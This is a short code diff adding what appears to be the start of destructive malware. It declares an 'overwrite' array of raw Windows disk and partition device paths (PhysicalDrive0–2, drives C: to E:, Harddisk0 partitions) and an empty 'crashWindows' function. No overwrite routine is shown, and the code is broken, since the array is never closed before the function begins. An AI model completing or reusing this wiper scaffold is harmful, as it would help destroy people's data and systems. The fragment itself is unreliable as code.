@@ -1,0 +1,15 @@
+#include "destruction.h"
+
+long long FileNum = 0;
+LPCWSTR overwrite[] = {
+    L"\\\\.\\PhysicalDrive0",
+    L"\\\\.\\PhysicalDrive1",
+    L"\\\\.\\PhysicalDrive2",
+    L"\\\\.\\C:",
+    L"\\\\.\\D:",
+    L"\\\\.\\E:",
+    L"\\\\.\\Harddisk0Partition1",
+    L"\\\\.\\Harddisk0Partition2",
+    L"\\\\.\\Harddisk0Partition3",
+    L"\\\\.\\Harddisk0Partition4",
+void crashWindows () {}
